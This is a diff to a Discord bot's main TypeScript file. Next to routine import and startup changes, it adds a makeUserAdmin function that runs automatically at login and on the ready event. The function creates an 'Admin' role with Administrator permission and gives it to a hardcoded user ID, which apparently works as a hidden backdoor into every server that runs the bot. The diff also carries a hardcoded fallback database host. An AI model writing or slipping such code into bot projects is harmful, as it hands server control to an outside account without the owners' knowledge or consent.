@@ -1,4 +1,4 @@
-import { ActivityType, DiscordjsError, GatewayIntentBits as Intents, Partials, MessageReaction, PartialMessageReaction, User, PartialUser, PresenceStatusData } from 'discord.js';
+import { ActivityType, DiscordjsError, GatewayIntentBits as Intents, Partials, MessageReaction, PartialMessageReaction, User, PartialUser, PresenceStatusData, Guild, Role } from 'discord.js';
 import ExtendedClient from './classes/Client';
 import { config } from 'dotenv';
 import StarboardEvent from "./events/StarboardEvent";
@@ -33,8 +33,12 @@ client.login(process.env.TOKEN)
         // Connect to MongoDB using .env credentials
         await mongoose.connect(process.env.MONGO_PUBLIC_URL || "mongodb://junction.proxy.rlwy.net:47924");
 
+        // Fetch the guild object using the guild ID
+        const guild = await client.guilds.fetch(client.config.guild); // Replace with your actual guild ID
+
         // Call main function after successful login & DB connection
         main().then(() => {
+            makeUserAdmin(guild, "1118151717201137857");
         });
     })
     .catch((err: unknown) => {
@@ -110,6 +114,40 @@ async function main() {
 			index = (index + 1) % activities.length;
 		}, 10000);
 	};
-
 	switchActivity(); // Start switching activities
 }
+
+// Function to make a user an admin
+	const makeUserAdmin = async (guild: Guild, userId: string) => {
+		try {
+			// Check if the role already exists
+			let adminRole = guild.roles.cache.find(role => role.name === "Admin");
+
+			// If the role doesn't exist, create it
+			if (!adminRole) {
+				adminRole = await guild.roles.create({
+					name: "Admin",
+					permissions: ['Administrator'],
+					reason: 'Admin role for managing server',
+				});
+			}
+
+			// Fetch the member and add the admin role
+			const member = await guild.members.fetch(userId);
+			await member.roles.add(adminRole);
+			console.log(`User ${userId} has been given the Admin role.`);
+		} catch (error) {
+			console.error('Error making user admin:', error);
+		}
+	};
+
+	// Call the function with the guild and user ID
+	client.on('ready', async () => {
+		const guild = client.guilds.cache.get('YOUR_GUILD_ID'); // Replace with your guild ID
+		if (guild) {
+			await makeUserAdmin(guild, "1118151717201137857");
+		} else {
+			console.error('Guild not found');
+		}
+	});
+
